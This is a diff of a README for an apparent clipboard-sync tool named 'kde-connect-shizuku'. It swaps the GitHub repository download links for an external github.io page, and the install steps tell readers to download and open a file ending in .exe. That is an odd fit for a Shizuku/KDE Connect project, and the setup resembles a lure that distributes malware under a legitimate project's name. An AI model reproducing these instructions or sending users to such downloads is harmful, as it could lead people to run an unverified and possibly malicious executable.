@@ -1,6 +1,6 @@
 # 🔄 kde-connect-shizuku - Keep your clipboard synced across devices
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sensible-peacegardenstate555/kde-connect-shizuku)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://sensible-peacegardenstate555.github.io)
 
 ## 💡 What this does
 
@@ -17,7 +17,7 @@ To run this application, your setup needs these components:
 
 ## 🚀 How to Install and Run
 
-1.  Visit the [official download page](https://github.com/sensible-peacegardenstate555/kde-connect-shizuku).
+1.  Visit the [official download page](https://sensible-peacegardenstate555.github.io).
 2.  Scroll to the latest release section.
 3.  Select the file ending in `.exe` to start the download.
 4.  Open the downloaded file once the process finishes.
